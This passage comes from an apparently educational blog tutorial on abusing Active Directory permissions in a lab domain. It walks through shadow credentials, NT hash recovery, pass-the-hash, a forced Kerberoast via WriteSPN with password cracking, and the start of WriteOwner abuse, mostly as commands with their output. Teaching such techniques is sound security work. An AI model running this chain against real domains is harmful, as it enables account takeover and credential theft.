<span class="mi">2025</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">20</span> <span class="mi">11</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="mi">54</span><span class="p">,</span><span class="mi">717</span> <span class="n">minikerberos</span> <span class="n">INFO</span>     <span class="n">Loading</span> <span class="n">certificate</span> <span class="n">and</span> <span class="n">key</span> <span class="n">from</span><span class="w"> </span><span class="nn">file</span>
<span class="n">INFO</span><span class="p">:</span><span class="n">minikerberos</span><span class="p">:</span><span class="n">Loading</span> <span class="n">certificate</span> <span class="n">and</span> <span class="n">key</span> <span class="n">from</span><span class="w"> </span><span class="nn">file</span>
<span class="mi">2025</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">20</span> <span class="mi">11</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="mi">54</span><span class="p">,</span><span class="mi">735</span> <span class="n">minikerberos</span> <span class="n">INFO</span>     <span class="n">Requesting</span> <span class="n">TGT</span>
<span class="n">INFO</span><span class="p">:</span><span class="n">minikerberos</span><span class="p">:</span><span class="n">Requesting</span> <span class="n">TGT</span>
<span class="n">Traceback</span> <span class="p">(</span><span class="n">most</span> <span class="n">recent</span> <span class="n">call</span> <span class="n">last</span><span class="p">):</span>
  <span class="n">File</span> <span class="s2">"/opt/PKINITtools/gettgtpkinit.py"</span><span class="p">,</span> <span class="n">line</span> <span class="mi">349</span><span class="p">,</span> <span class="ow">in</span> <span class="o">&lt;</span><span class="n">module</span><span class="o">&gt;</span>
    <span class="n">main</span><span class="p">()</span>
  <span class="n">File</span> <span class="s2">"/opt/PKINITtools/gettgtpkinit.py"</span><span class="p">,</span> <span class="n">line</span> <span class="mi">345</span><span class="p">,</span> <span class="ow">in</span> <span class="n">main</span>
    <span class="n">amain</span><span class="p">(</span><span class="n">args</span><span class="p">)</span>
  <span class="n">File</span> <span class="s2">"/opt/PKINITtools/gettgtpkinit.py"</span><span class="p">,</span> <span class="n">line</span> <span class="mi">315</span><span class="p">,</span> <span class="ow">in</span> <span class="n">amain</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">sendrecv</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
  <span class="n">File</span> <span class="s2">"/opt/venv/lib/python3.10/site-packages/minikerberos/network/clientsocket.py"</span><span class="p">,</span> <span class="n">line</span> <span class="mi">85</span><span class="p">,</span> <span class="ow">in</span> <span class="n">sendrecv</span>
    <span class="k">raise</span> <span class="n">KerberosError</span><span class="p">(</span><span class="n">krb_message</span><span class="p">)</span>
<span class="n">minikerberos</span><span class="o">.</span><span class="n">protocol</span><span class="o">.</span><span class="n">errors</span><span class="o">.</span><span class="n">KerberosError</span><span class="p">:</span>  <span class="n">Error</span> <span class="n">Name</span><span class="p">:</span> <span class="n">KRB_AP_ERR_SKEW</span> <span class="n">Detail</span><span class="p">:</span> <span class="s2">"The clock skew is too great"</span>
</pre></div>
<p>Oh, something went wrong! The communication returned a <code>KRB_AP_ERR_SKEW</code> error. This happens because our system clock is not synchronized with the <strong>DC</strong>—the time difference exceeds the allowed 5-minute threshold. To fix this, we can simply synchronize our clock with the <strong>DC</strong> using <code>ntpdate</code>.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">root@ubuntu$</span> <span class="n">ntpdate</span> <span class="mf">192.168.100.3</span>
<span class="mi">2025</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">20</span> <span class="mi">16</span><span class="p">:</span><span class="mi">30</span><span class="p">:</span><span class="mf">44.963944</span> <span class="p">(</span><span class="o">-</span><span class="mi">0300</span><span class="p">)</span> <span class="o">+</span><span class="mf">17196.437578</span> <span class="o">+/-</span> <span class="mf">0.001233</span> <span class="mf">192.168.100.3</span> <span class="n">s1</span> <span class="n">no</span><span class="o">-</span><span class="n">leap</span>
<span class="n">CLOCK</span><span class="p">:</span> <span class="n">time</span> <span class="n">stepped</span> <span class="n">by</span> <span class="mf">17196.437578</span>
</pre></div>
<p>Now, let's try running the script again:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">python</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">PKINITtools</span><span class="o">/</span><span class="n">gettgtpkinit</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">cert</span><span class="o">-</span><span class="n">pfx</span> <span class="n">jPkjXpLo</span><span class="o">.</span><span class="n">pfx</span> <span class="o">-</span><span class="n">pfx</span><span class="o">-</span><span class="k">pass</span> <span class="n">sUPJIoebvkwrDSvQE0fr</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="mf">192.168.100.3</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="o">/</span><span class="n">john</span> <span class="n">john</span><span class="o">.</span><span class="n">ccache</span>
<span class="mi">2025</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">20</span> <span class="mi">16</span><span class="p">:</span><span class="mi">31</span><span class="p">:</span><span class="mi">41</span><span class="p">,</span><span class="mi">020</span> <span class="n">minikerberos</span> <span class="n">INFO</span>     <span class="n">Loading</span> <span class="n">certificate</span> <span class="n">and</span> <span class="n">key</span> <span class="n">from</span><span class="w"> </span><span class="nn">file</span>
<span class="n">INFO</span><span class="p">:</span><span class="n">minikerberos</span><span class="p">:</span><span class="n">Loading</span> <span class="n">certificate</span> <span class="n">and</span> <span class="n">key</span> <span class="n">from</span><span class="w"> </span><span class="nn">file</span>
<span class="mi">2025</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">20</span> <span class="mi">16</span><span class="p">:</span><span class="mi">31</span><span class="p">:</span><span class="mi">41</span><span class="p">,</span><span class="mi">037</span> <span class="n">minikerberos</span> <span class="n">INFO</span>     <span class="n">Requesting</span> <span class="n">TGT</span>
<span class="n">INFO</span><span class="p">:</span><span class="n">minikerberos</span><span class="p">:</span><span class="n">Requesting</span> <span class="n">TGT</span>
<span class="mi">2025</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">20</span> <span class="mi">16</span><span class="p">:</span><span class="mi">31</span><span class="p">:</span><span class="mi">41</span><span class="p">,</span><span class="mi">060</span> <span class="n">minikerberos</span> <span class="n">INFO</span>     <span class="n">AS</span><span class="o">-</span><span class="n">REP</span> <span class="n">encryption</span> <span class="n">key</span> <span class="p">(</span><span class="n">you</span> <span class="n">might</span> <span class="n">need</span> <span class="n">this</span> <span class="n">later</span><span class="p">):</span>
<span class="n">INFO</span><span class="p">:</span><span class="n">minikerberos</span><span class="p">:</span><span class="n">AS</span><span class="o">-</span><span class="n">REP</span> <span class="n">encryption</span> <span class="n">key</span> <span class="p">(</span><span class="n">you</span> <span class="n">might</span> <span class="n">need</span> <span class="n">this</span> <span class="n">later</span><span class="p">):</span>
<span class="mi">2025</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">20</span> <span class="mi">16</span><span class="p">:</span><span class="mi">31</span><span class="p">:</span><span class="mi">41</span><span class="p">,</span><span class="mi">060</span> <span class="n">minikerberos</span> <span class="n">INFO</span>     <span class="mi">918</span><span class="n">fca40477c90a0ea14f83ef8a53961f39d2cc6709a24036cc93c89ca66cdc6</span>
<span class="n">INFO</span><span class="p">:</span><span class="n">minikerberos</span><span class="p">:</span><span class="mi">918</span><span class="n">fca40477c90a0ea14f83ef8a53961f39d2cc6709a24036cc93c89ca66cdc6</span>
<span class="mi">2025</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">20</span> <span class="mi">16</span><span class="p">:</span><span class="mi">31</span><span class="p">:</span><span class="mi">41</span><span class="p">,</span><span class="mi">063</span> <span class="n">minikerberos</span> <span class="n">INFO</span>     <span class="n">Saved</span> <span class="n">TGT</span> <span class="n">to</span> <span class="n">file</span>
<span class="n">INFO</span><span class="p">:</span><span class="n">minikerberos</span><span class="p">:</span><span class="n">Saved</span> <span class="n">TGT</span> <span class="n">to</span> <span class="n">file</span>
</pre></div>
<p>Great! This time, we successfully obtained a <strong>TGT</strong>, which has been saved in the <code>john.ccache</code> file. Now, we can use it as an authentication method for <strong>john</strong>.</p><br/>
<p>You could use <code>john.ccache</code> as an authentication method, and it would work seamlessly:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">nxc</span> <span class="n">smb</span> <span class="mf">192.168.100.3</span> <span class="o">--</span><span class="n">use</span><span class="o">-</span><span class="n">kcache</span>
<span class="p">SMB</span>         <span class="n">dc01</span>            <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p" style="color: #2489a5">[*]</span> <span class="n">Windows</span> <span class="n">Server</span> <span class="mi">2022</span> <span class="n">Build</span> <span class="mi">20348</span> <span class="n">x64</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">DC01</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="p">:</span><span class="kc">True</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="p">:</span><span class="kc">False</span><span class="p">)</span>
<span class="p">SMB</span>         <span class="n">dc01</span>            <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p" style="color: #2d9e34">[+]</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>\<span class="n">john</span> <span class="n">from</span><span class="w"> </span><span class="nn">ccache</span>
</pre></div>
<p>However, you can also attempt to recover <strong>john's</strong> NT hash using the <code>ccache</code> file and the <strong>AS-REP encryption key</strong> returned by <code>gettgtpkinit.py</code>. To do this, we can leverage <code>getnthash.py</code> from the <strong>PKINITtools</strong> suite, which requires the <strong>AS-REP encryption key</strong> along with the exported <code>ccache</code> in the <code>KRB5CCNAME</code> environment variable:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">export</span> <span class="n">KRB5CCNAME</span><span class="o">=</span><span class="n">john</span><span class="o">.</span><span class="n">ccache</span>
<span class="nd">elswix@ubuntu$</span> <span class="n">python</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">PKINITtools</span><span class="o">/</span><span class="n">getnthash</span><span class="o">.</span><span class="n">py</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="o">/</span><span class="n">john</span> <span class="o">-</span><span class="n">key</span> <span class="mi">918</span><span class="n">fca40477c90a0ea14f83ef8a53961f39d2cc6709a24036cc93c89ca66cdc6</span>
<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.12.0</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="n">Fortra</span><span class="p">,</span> <span class="n">LLC</span> <span class="n">and</span> <span class="n">its</span> <span class="n">affiliated</span> <span class="n">companies</span> 

<span class="p" style="color: #2489a5">[*]</span> <span class="n">Using</span> <span class="n">TGT</span> <span class="n">from</span><span class="w"> </span><span class="nn">cache</span>
<span class="p" style="color: #2489a5">[*]</span> <span class="n">Requesting</span> <span class="n">ticket</span> <span class="n">to</span> <span class="bp">self</span> <span class="n">with</span> <span class="n">PAC</span>
<span class="n">Recovered</span> <span class="n">NT</span> <span class="n">Hash</span>
<span class="n">fdb56c6d2e5c63c544c11eff76dff87a</span>
</pre></div>
<p>Now that we have successfully retrieved the NT hash, we can proceed with <strong>Pass-The-Hash (PTH)</strong>:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">nxc</span> <span class="n">smb</span> <span class="mf">192.168.100.3</span> <span class="o">-</span><span class="n">u</span> <span class="n">john</span> <span class="o">-</span><span class="n">H</span> <span class="n">fdb56c6d2e5c63c544c11eff76dff87a</span>
<span class="p">SMB</span>         <span class="mf">192.168.100.3</span>   <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p" style="color: #2489a5">[*]</span> <span class="n">Windows</span> <span class="n">Server</span> <span class="mi">2022</span> <span class="n">Build</span> <span class="mi">20348</span> <span class="n">x64</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">DC01</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="p">:</span><span class="kc">True</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="p">:</span><span class="kc">False</span><span class="p">)</span>
<span class="p">SMB</span>         <span class="mf">192.168.100.3</span>   <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p" style="color: #2d9e34">[+]</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>\<span class="n">john</span><span class="p">:</span><span class="n">fdb56c6d2e5c63c544c11eff76dff87a</span>
</pre></div>
<p>The previous example used <code>pywhisker</code> and <code>PKINITtools</code>. As mentioned earlier, multiple tools can achieve the same result—even <code>bloodyAD</code>, which we've already used. However, I want to introduce another approach using <code>certipy</code>, so you can familiarize yourself with different tools.</p><br/>
<p>Unlike <code>pywhisker</code>, which modifies the <code>msDS-KeyCredentialLink</code> attribute and then requires exporting the PFX file, requesting a TGT with <code>gettgtpkinit.py</code>, and finally retrieving the NT hash with <code>getnthash.py</code>, <code>certipy</code> streamlines this entire process. Once a <strong>Shadow Credential</strong> is added, <code>certipy</code> automatically retrieves the NT hash, significantly accelerating the attack.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">certipy</span> <span class="n">shadow</span> <span class="n">auto</span> <span class="o">-</span><span class="n">username</span> <span class="n">arthur</span><span class="n">@elswixcorp</span><span class="o">.</span><span class="n">local</span> <span class="o">-</span><span class="n">password</span> <span class="s1">'P4ssword123!'</span> <span class="o">-</span><span class="n">account</span> <span class="n">john</span> <span class="o">-</span><span class="n">target</span> <span class="mf">192.168.100.3</span>
<span class="n">Certipy</span> <span class="n">v4</span><span class="mf">.8.2</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>

<span class="p" style="color: #2489a5">[*]</span> <span class="n">Targeting</span> <span class="n">user</span> <span class="s1">'john'</span>
<span class="p" style="color: #2489a5">[*]</span> <span class="n">Generating</span> <span class="n">certificate</span>
<span class="p" style="color: #2489a5">[*]</span> <span class="n">Certificate</span> <span class="n">generated</span>
<span class="p" style="color: #2489a5">[*]</span> <span class="n">Generating</span> <span class="n">Key</span> <span class="n">Credential</span>
<span class="p" style="color: #2489a5">[*]</span> <span class="n">Key</span> <span class="n">Credential</span> <span class="n">generated</span> <span class="n">with</span> <span class="n">DeviceID</span> <span class="s1">'67be8c9d-fe4e-f3f2-285e-da440a7f0aff'</span>
<span class="p" style="color: #2489a5">[*]</span> <span class="n">Adding</span> <span class="n">Key</span> <span class="n">Credential</span> <span class="n">with</span> <span class="n">device</span> <span class="n">ID</span> <span class="s1">'67be8c9d-fe4e-f3f2-285e-da440a7f0aff'</span> <span class="n">to</span> <span class="n">the</span> <span class="n">Key</span> <span class="n">Credentials</span> <span class="n">for</span> <span class="s1">'john'</span>
<span class="p" style="color: #2489a5">[*]</span> <span class="n">Successfully</span> <span class="n">added</span> <span class="n">Key</span> <span class="n">Credential</span> <span class="n">with</span> <span class="n">device</span> <span class="n">ID</span> <span class="s1">'67be8c9d-fe4e-f3f2-285e-da440a7f0aff'</span> <span class="n">to</span> <span class="n">the</span> <span class="n">Key</span> <span class="n">Credentials</span> <span class="n">for</span> <span class="s1">'john'</span>
<span class="p" style="color: #2489a5">[*]</span> <span class="n">Authenticating</span> <span class="n">as</span> <span class="s1">'john'</span> <span class="n">with</span> <span class="n">the</span> <span class="n">certificate</span>
<span class="p" style="color: #2489a5">[*]</span> <span class="n">Using</span> <span class="n">principal</span><span class="p">:</span> <span class="n">john</span><span class="n">@elswixcorp</span><span class="o">.</span><span class="n">local</span>
<span class="p" style="color: #2489a5">[*]</span> <span class="n">Trying</span> <span class="n">to</span> <span class="n">get</span> <span class="n">TGT</span><span class="o">...</span>
<span class="p" style="color: #2489a5">[*]</span> <span class="n">Got</span> <span class="n">TGT</span>
<span class="p" style="color: #2489a5">[*]</span> <span class="n">Saved</span> <span class="n">credential</span> <span class="n">cache</span> <span class="n">to</span> <span class="s1">'john.ccache'</span>
<span class="p" style="color: #2489a5">[*]</span> <span class="n">Trying</span> <span class="n">to</span> <span class="n">retrieve</span> <span class="n">NT</span> <span class="nb">hash</span> <span class="n">for</span> <span class="s1">'john'</span>
<span class="p" style="color: #2489a5">[*]</span> <span class="n">Restoring</span> <span class="n">the</span> <span class="n">old</span> <span class="n">Key</span> <span class="n">Credentials</span> <span class="n">for</span> <span class="s1">'john'</span>
<span class="p" style="color: #2489a5">[*]</span> <span class="n">Successfully</span> <span class="n">restored</span> <span class="n">the</span> <span class="n">old</span> <span class="n">Key</span> <span class="n">Credentials</span> <span class="n">for</span> <span class="s1">'john'</span>
<span class="p" style="color: #2489a5">[*]</span> <span class="n">NT</span> <span class="nb">hash</span> <span class="n">for</span> <span class="s1">'john'</span><span class="p">:</span> <span class="n">fdb56c6d2e5c63c544c11eff76dff87a</span>
</pre></div>
<p>Pretty amazing, right? Let's keep going.</p><br/>
<h3>WriteSPN on ellie</h3><br/>
<p>As <strong>john</strong>, we have <code>WriteSPN</code> over <strong>ellie</strong>, which essentially allows us to create or modify the <code>servicePrincipalName</code> (SPN) attribute for this account.</p><br/>
<p>An SPN is a unique identifier for a service instance within an Active Directory environment. It allows Kerberos authentication to map a service request to the correct account. Typically, service accounts—such as those used by SQL Server, IIS, or other networked services—are assigned SPNs so clients can request authentication tickets for them.</p><br/>
<p>Because we control <strong>ellie</strong>'s SPN, we can register a fake SPN to the account, effectively making it appear as if it were running a legitimate service. This manipulation allows us to request a <strong>Service Ticket (ST)</strong> from the Key Distribution Center (KDC).</p><br/>
<p>Now, recalling what we've discussed in previous articles, accounts that have an SPN assigned are susceptible to a well-known attack called <strong>Kerberoasting</strong>. This attack involves requesting a Service Ticket (ST) for a given service. Since STs are encrypted using the NT hash/AES Key of the service account, an attacker can extract them from memory and attempt to brute-force or crack them offline to recover the service account's password.</p><br/>
<p>By leveraging <code>WriteSPN</code>, we are essentially injecting a vulnerability into <strong>ellie</strong>'s account, turning it into a potential Kerberoasting target under our control. </p><br/>
<p>For this purpose, we will use <a href="https://github.com/dirkjanm/krbrelayx/blob/master/addspn.py">addspn.py</a> from the <a href="https://github.com/dirkjanm/krbrelayx">krbrelayx</a> repository:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">python</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">krbrelayx</span><span class="o">/</span><span class="n">addspn</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'elswixcorp.local\john'</span> <span class="o">-</span><span class="n">p</span> <span class="s1">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:fdb56c6d2e5c63c544c11eff76dff87a'</span>  <span class="o">-</span><span class="n">t</span> <span class="n">ellie</span> <span class="o">--</span><span class="n">spn</span> <span class="s1">'http/ellie'</span> <span class="mf">192.168.100.3</span>
<span class="p" style="color: #b83c3c">[-]</span> <span class="n">Connecting</span> <span class="n">to</span> <span class="n">host</span><span class="o">...</span>
<span class="p" style="color: #b83c3c">[-]</span> <span class="n">Binding</span> <span class="n">to</span> <span class="n">host</span>
<span class="p" style="color: #2d9e34">[+]</span> <span class="n">Bind</span> <span class="n">OK</span>
<span class="p" style="color: #2d9e34">[+]</span> <span class="n">Found</span> <span class="n">modification</span> <span class="n">target</span>
<span class="p" style="color: #2d9e34">[+]</span> <span class="n">SPN</span> <span class="n">Modified</span> <span class="n">successfully</span>
</pre></div>
<p>It seems that it worked. Just in case you're wondering why I provided <code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:fdb56c6d2e5c63c544c11eff76dff87a</code> as the password—this is because NTLM authentication requires the <code>LM:NT</code> hash format. However, in modern systems, the <strong>LM (LAN Manager) hash</strong> is not relevant for authentication since it is an outdated and insecure hashing method that is disabled by default in newer Windows versions. As a result, we can simply use any 32 random characters for the LM hash and specify the valid NT hash after the <code>:</code>.</p><br/>
<p>If the SPN was successfully modified, we should now be able to request a Service Ticket (ST) using <code>GetUserSPNs.py</code>. This will allow us to retrieve a ticket encrypted with the service account’s NT hash, which we can attempt to crack. Let's check it out:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">GetUserSPNs</span><span class="o">.</span><span class="n">py</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="o">/</span><span class="n">john</span> <span class="o">-</span><span class="n">hashes</span> <span class="p">:</span><span class="n">fdb56c6d2e5c63c544c11eff76dff87a</span>
<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.12.0</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="n">Fortra</span><span class="p">,</span> <span class="n">LLC</span> <span class="n">and</span> <span class="n">its</span> <span class="n">affiliated</span> <span class="n">companies</span> 

<span class="n">ServicePrincipalName</span>  <span class="n">Name</span>   <span class="n">MemberOf</span>  <span class="n">PasswordLastSet</span>             <span class="n">LastLogon</span>  <span class="n">Delegation</span> 
<span class="o">--------------------</span>  <span class="o">-----</span>  <span class="o">--------</span>  <span class="o">--------------------------</span>  <span class="o">---------</span>  <span class="o">----------</span>
<span class="n">http</span><span class="o">/</span><span class="n">ellie</span>            <span class="n">ellie</span>            <span class="mi">2025</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">20</span> <span class="mi">00</span><span class="p">:</span><span class="mi">30</span><span class="p">:</span><span class="mf">50.772860</span>  <span class="o">&lt;</span><span class="n">never</span><span class="o">&gt;</span>
</pre></div>
<p>As observed, an SPN was found for the account <strong>ellie</strong>, confirming that the <code>servicePrincipalName</code> attribute was successfully modified. Now, by using the <code>-request</code> parameter, we should be able to request and retrieve a Service Ticket (ST) for this SPN.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">GetUserSPNs</span><span class="o">.</span><span class="n">py</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="o">/</span><span class="n">john</span> <span class="o">-</span><span class="n">hashes</span> <span class="p">:</span><span class="n">fdb56c6d2e5c63c544c11eff76dff87a</span> <span class="o">-</span><span class="n">request</span>
<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.12.0</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="n">Fortra</span><span class="p">,</span> <span class="n">LLC</span> <span class="n">and</span> <span class="n">its</span> <span class="n">affiliated</span> <span class="n">companies</span> 

<span class="n">ServicePrincipalName</span>  <span class="n">Name</span>   <span class="n">MemberOf</span>  <span class="n">PasswordLastSet</span>             <span class="n">LastLogon</span>  <span class="n">Delegation</span> 
<span class="o">--------------------</span>  <span class="o">-----</span>  <span class="o">--------</span>  <span class="o">--------------------------</span>  <span class="o">---------</span>  <span class="o">----------</span>
<span class="n">http</span><span class="o">/</span><span class="n">ellie</span>            <span class="n">ellie</span>            <span class="mi">2025</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">20</span> <span class="mi">00</span><span class="p">:</span><span class="mi">30</span><span class="p">:</span><span class="mf">50.772860</span>  <span class="o">&lt;</span><span class="n">never</span><span class="o">&gt;</span>               



<span class="p" style="color: #b83c3c">[-]</span> <span class="n">CCache</span> <span class="n">file</span> <span class="n">is</span> <span class="n">not</span> <span class="n">found</span><span class="o">.</span> <span class="n">Skipping</span><span class="o">...</span>
<span class="n">$</span><span class="n">krb5tgs</span><span class="n">$</span><span class="mi">23</span><span class="n">$</span><span class="o">*</span><span class="n">ellie</span><span class="n">$</span><span class="n">ELSWIXCORP</span><span class="o">.</span><span class="n">LOCAL</span><span class="n">$</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="o">/</span><span class="n">ellie</span><span class="o">*</span><span class="n">$</span><span class="n">f1a035075b920e02e105ae074f8b9965</span><span class="n">$</span><span class="mi">24</span><span class="n">fa59450ee4ef339aec3c607a4c99cb0a33704a25e739b0612</span><span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span><span class="n">df6aaaf974dd4c0b29d71414e17074b80edba63cd636e020d5b77137f05258a16f559033558744</span>
</pre></div>
<p>Once we obtain the ST, we can attempt to crack it using tools such as <a href="https://github.com/openwall/john">John the Ripper</a>:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu</span><span class="nd">$</span> <span class="n">john</span> <span class="o">-</span><span class="n">w</span><span class="p">:$</span><span class="p">(</span><span class="n">locate</span> <span class="n">rockyou</span><span class="o">.</span><span class="n">txt</span><span class="p">)</span> <span class="nb">hash</span>
<span class="n">Using</span> <span class="n">default</span> <span class="nb">input</span> <span class="n">encoding</span><span class="p">:</span> <span class="n">UTF</span><span class="o">-</span><span class="mi">8</span>
<span class="n">Loaded</span> <span class="mi">1</span> <span class="n">password</span> <span class="nb">hash</span> <span class="p">(</span><span class="n">krb5tgs</span><span class="p">,</span> <span class="n">Kerberos</span> <span class="mi">5</span> <span class="n">TGS</span><span class="o">-</span><span class="n">REP</span> <span class="n">etype</span> <span class="mi">23</span> <span class="p">[</span><span class="n">MD4</span> <span class="n">HMAC</span><span class="o">-</span><span class="n">MD5</span> <span class="n">RC4</span><span class="p">])</span>
<span class="n">Will</span> <span class="n">run</span> <span class="mi">4</span> <span class="n">OpenMP</span> <span class="n">threads</span>
<span class="n">Press</span> <span class="s1">'q'</span> <span class="ow">or</span> <span class="n">Ctrl</span><span class="o">-</span><span class="n">C</span> <span class="n">to</span> <span class="n">abort</span><span class="p">,</span> <span class="s1">'h'</span> <span class="n">for</span> <span class="n">help</span><span class="p">,</span> <span class="n">almost</span> <span class="nb">any</span> <span class="n">other</span> <span class="n">key</span> <span class="n">for</span> <span class="n">status</span>
<span class="p">@williams2</span>       <span class="p">(</span><span class="err">?</span><span class="p">)</span>  
<span class="mi">1</span><span class="n">g</span> <span class="mi">0</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">04</span> <span class="n">DONE</span> <span class="p">(</span><span class="mi">2025</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">21</span> <span class="mi">14</span><span class="p">:</span><span class="mi">28</span><span class="p">)</span> <span class="mf">0.2137</span><span class="n">g</span><span class="o">/</span><span class="n">s</span> <span class="mi">2453</span><span class="n">Kp</span><span class="o">/</span><span class="n">s</span> <span class="mi">2453</span><span class="n">Kc</span><span class="o">/</span><span class="n">s</span> <span class="mi">2453</span><span class="n">KC</span><span class="o">/</span><span class="n">s</span> <span class="n">A</span><span class="o">.</span><span class="n">D</span><span class="o">.</span><span class="n">L</span><span class="o">.</span><span class="n">M</span><span class="o">.</span><span class="n">T</span><span class="o">..</span><span class="n">@stewart</span>
<span class="n">Use</span> <span class="n">the</span> <span class="s2">"--show"</span> <span class="n">option</span> <span class="n">to</span> <span class="n">display</span> <span class="nb">all</span> <span class="n">of</span> <span class="n">the</span> <span class="n">cracked</span> <span class="n">passwords</span> <span class="n">reliably</span>
<span class="n">Session</span> <span class="n">completed</span><span class="o">.</span>
</pre></div>
<p>Great! The password was successfully cracked. Now, we can use it to authenticate as <strong>ellie</strong>:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">nxc</span> <span class="n">smb</span> <span class="mf">192.168.100.3</span> <span class="o">-</span><span class="n">u</span> <span class="n">ellie</span> <span class="o">-</span><span class="n">p</span> <span class="n">@williams2</span>
<span class="p">SMB</span>         <span class="mf">192.168.100.3</span>   <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p" style="color: #2489a5">[*]</span> <span class="n">Windows</span> <span class="n">Server</span> <span class="mi">2022</span> <span class="n">Build</span> <span class="mi">20348</span> <span class="n">x64</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">DC01</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="p">:</span><span class="kc">True</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="p">:</span><span class="kc">False</span><span class="p">)</span>
<span class="p">SMB</span>         <span class="mf">192.168.100.3</span>   <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p" style="color: #2d9e34">[+]</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>\<span class="n">ellie</span><span class="p">:</span><span class="n">@williams2</span>
</pre></div>
<h3>Note</h3><br/>
<p>The success of this attack depends on the complexity of the vulnerable account's password. While you may be able to request an ST, recovering the password depends on whether it exists in the specified wordlist. For example, the <strong>krbtgt</strong> account could theoretically be vulnerable to a Kerberoasting attack, but its password is typically very strong, randomly generated, and rotated every 180 days—making it practically infeasible to crack.</p><br/>
<h3>WriteOwner over elswix</h3><br/>
<p><strong>Ellie</strong> has <code>WriteOwner</code> over <strong>elswix</strong>. This privilege allows us to modify the <strong>owner</strong> of the account, effectively granting us full control over it. By changing the owner to ourselves, we gain the ability to modify its permissions, including assigning ourselves <code>GenericAll</code>, which provides complete control over the account.</p><br/>
<p>Initially, let's modify <strong>elswix</strong>'s owner to <strong>ellie</strong>. To achieve this, we can use <code>owneredit.py</code> from the Impacket suite:</p><br/>
